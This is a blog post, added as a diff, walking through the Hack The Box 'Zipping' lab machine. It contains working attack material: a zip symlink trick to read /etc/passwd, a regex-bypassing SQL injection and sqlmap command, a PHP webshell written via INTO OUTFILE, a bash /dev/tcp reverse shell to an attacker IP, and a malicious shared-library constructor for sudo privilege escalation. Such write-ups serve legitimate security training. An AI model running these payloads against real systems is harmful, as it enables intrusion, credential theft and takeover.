@@ -1,0 +1,209 @@
+---
+layout: post
+title:  "Zipping Machine (Medium)"
+date:   2024-01-29 17:04:54 +0100
+categories: ["SQL Injection", "Path Traversal", "Reverse Engineering"]
+---
+
+# Hack The Box - Zipping Walkthrough
+
+### Services Enumeration
+The first step is to enumerate the services of the machine.
+
+```
+sudo nmap -sC -sV -p22,80 zipping.htb
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-26 16:35 CET
+Nmap scan report for zipping.htb (10.10.11.229)
+Host is up (0.042s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.0p1 Ubuntu 1ubuntu7.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 9d:6e:ec:02:2d:0f:6a:38:60:c6:aa:ac:1e:e0:c2:84 (ECDSA)
+|_  256 eb:95:11:c7:a6:fa:ad:74:ab:a2:c5:f6:a4:02:18:41 (ED25519)
+80/tcp open  http    Apache httpd 2.4.54 ((Ubuntu))
+|_http-title: Zipping | Watch store
+|_http-server-header: Apache/2.4.54 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 10.51 seconds
+```
+
+We can see that there is only two services ssh and a web application. The web application provides various avenues for exploitation. The "Work for us" page allows only a .pdf file within a .zip file to be uploaded. Exploiting a symlink vulnerability, we can make the server expose sensitive data.
+
+### Symlink Exploitation
+- Create a symbolic link to a specific file (e.g., `/etc/passwd`):
+
+```bash
+ln -s ../../../../../../etc/passwd symindex.pdf
+```
+
+- Create a .zip file with the symlink inside:
+
+```bash
+zip --symlinks test.zip symindex.pdf
+```
+
+This vulnerability only grants the ability to read any file on the server, but it does not allow the execution of .php files or listing files under a directory.
+
+### Initial Enumeration
+Upload the .zip and go to the .pdf file, I recommend use Burp Suite to see the response of the server. The Developer Tools of browsers didn't work for me. Extracting the contents of `/etc/passwd` from the server reveals user information, i.e. user named "rektsu". 
+
+```
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-timesync:x:102:103:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
+systemd-resolve:x:104:110:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+pollinate:x:105:1::/var/cache/pollinate:/bin/false
+sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
+rektsu:x:1001:1001::/home/rektsu:/bin/bash
+mysql:x:107:115:MySQL Server,,,:/nonexistent:/bin/false
+_laurel:x:999:999::/var/log/laurel:/bin/false
+```
+
+Exploiting this vulnerability we can obtain valuables files such as:
+
+- `/var/www/html/index.php`
+- `/var/www/html/shop/index.php`
+- `/var/www/html/shop/cart.php`
+- `/var/www/html/shop/products.php`
+- `/var/www/html/shop/home.php`
+- `/var/www/html/shop/functions.php`
+
+In the `/var/www/html/shop/functions.php` we will get database credentials:
+
+```php
+$DATABASE_HOST = 'localhost';
+$DATABASE_USER = 'root';
+$DATABASE_PASS = 'MySQL_P@ssw0rd!';
+$DATABASE_NAME = 'zipping';
+```
+
+### Path Traversal Vulnerability
+Identified a path traversal vulnerability revealing crucial server-side files (index.php, cart.php, etc.) under `/var/www/html/shop/index.php`.
+
+```php
+<?php
+session_start();
+// Include functions and connect to the database using PDO MySQL
+include 'functions.php';
+$pdo = pdo_connect_mysql();
+// Page is set to home (home.php) by default, so when the visitor visits, that will be the page they see.
+$page = isset($_GET['page']) && file_exists($_GET['page'] . '.php') ? $_GET['page'] : 'home';
+// Include and show the requested page
+include $page . '.php';
+?>
+```
+This php code allows us to execute a .php file from any location of server.
+
+### SQL Injection Discovery
+Discovered an SQL injection vulnerability within `/var/www/html/shop/cart.php`, allowing manipulation of the `product_id` parameter.
+```php
+$product_id = $_POST['product_id'];
+$quantity = $_POST['quantity'];
+// Filtering user input for letters or special characters
+if(preg_match("/^.*[A-Za-z!#$%^&*()\-_=+{}\[\]\\|;:'\",.<>\/?]|[^0-9]$/", $product_id, $match) || preg_match("/^.*[A-Za-z!#$%^&*()\-_=+{}[\]\\|;:'\",.<>\/?]/i", $quantity, $match)) {
+    echo '';
+} else {
+    // Construct the SQL statement with a vulnerable parameter
+    $sql = "SELECT * FROM products WHERE id = '" . $_POST['product_id'] . "'";
+    // Execute the SQL statement without any sanitization or parameter binding
+    $product = $pdo->query($sql)->fetch(PDO::FETCH_ASSOC);
+    ...
+}
+```
+
+
+We notice that the `product_id` parameter is being used without proper sanitization and could potentially be exploited for SQL injection. However, we're unable to input any letters or any symbols.
+Firstly, we need to bypass the regex function. We require a specific payload: it should start with a newline character, followed by the SQL injection, and finally end with a number, formatted as such (remember to URL encode before sending the request)...
+
+```sql
+
+1' and sleep(10) -- -1
+```
+
+### SQLMap Enumeration
+Once we realize we can perform an SQLi, we find it's a Blind SQLi, meaning we won't be able to directly view the response from our SQLi. This slows down the FootPrinting process, but with some patience and the 'sqlmap' tool, we can enumerate the database. The following command serves as an example of enumeration:
+
+```bash
+sqlmap -u "http://zipping.htb/shop/index.php?page=cart" --data="product_id=1&quantity=1" --skip="quantity" --prefix="%0a'" --suffix="-- -1" --dbms="MySQL" -D zipping -T products --schema --ignore-redirects --common-columns
+```
+<i>Note: %0a is the URL encode of a new line \n.</i>
+
+After enumerating the database, this is the most valuable information I got:
+- Database: Zipping
+- Tables: products
+- Privileges FILE: Y
+- @@data_dir: `/var/lib/mysql`
+
+We notice that we can write a file but only in the `/var/lib/mysql` directory. A little recap, we have found that we can write a .php file and we can execute a php file from any directory using the Path Traversal at the `/shop/index.php=page=[MALICOUS_PHP_FILE]`.
+
+### Exploiting SQL Injection and Path Traversal to Gain Shell Access
+The next SQLi will write a webshell at `/var/lib/mysql/shell.php`, this web shell works with GET request and the parameter `0=[command]`.
+
+```sql
+
+1'; SELECT "<?php system($_GET[0]); ?>" INTO OUTFILE '/var/lib/mysql/shell.php'; -- -1
+```
+
+Now access the URL `http://zipping.htb/shop/index.php?page=/var/lib/mysql/shell.php?0=[REVERSE_SHELL_PAYLOAD]`
+
+You can obtain a reverse shell at https://www.revshells.com/. An example of reverse shell would be:
+
+```bash
+/bin/bash -c '/bin/bash -i >& /dev/tcp/[YOUR-IP]/7000 0>&1'
+```
+
+<i>Note: I always use `/bin/bash -c` as a prefix beucase it has a better percentage of success.</i>
+
+## Privilege Escalation
+
+After obtaining a shell as "rektsu". the next step involves privilege escalation. Initially, we'll enumerate the machine using the `sudo -l` command, discovering that we can execute the `/usr/bin/stock` binary as sudo without being prompted for a password. Upon this realization, we execute it to observe its behavior and notice the absence of a password prompt.
+
+### Reverse Engineering
+Consequently, we analyze the binary using the `strings /usr/bin/stock` command, extracting various strings from the executable. Notably, before prompting for a password, there exists the string "St0ckM4nager". Further analysis of the strings reveals a CSV file loaded at `/root/stock.csv`. Executing the binary with the password exposes a small program offering stock display and edit options. However, attempting to inject any commands proves unsuccessful.
+
+If we utilize the `strace` command to run the `/usr/bin/stock` binary and input the password, we'll notice it attempts to load a file from `/home/rektsu/.config/libcounter.so`, indicating that it hasn't been found. When checking for this file, it indeed doesn't exist, but we have the capability to create it.
+
+### Creating libcounter.so
+we'll create the `libcounter.so` file, allowing us solely to view the root flag, although it's also possible to obtain a shell.
+
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+
+void __attribute__((constructor)) load_shellcode() {
+    system("cat /root/root.txt");
+}
+```
+Compiled the shared object file:
+
+```bash
+gcc -fPIC -shared -o libcounter.so libcounter.c
+```
+
+### Final Execution
+Finnally, just execute the binary as sudo an obtain the flag.
+```
+sudo /usr/bin/stock
+```
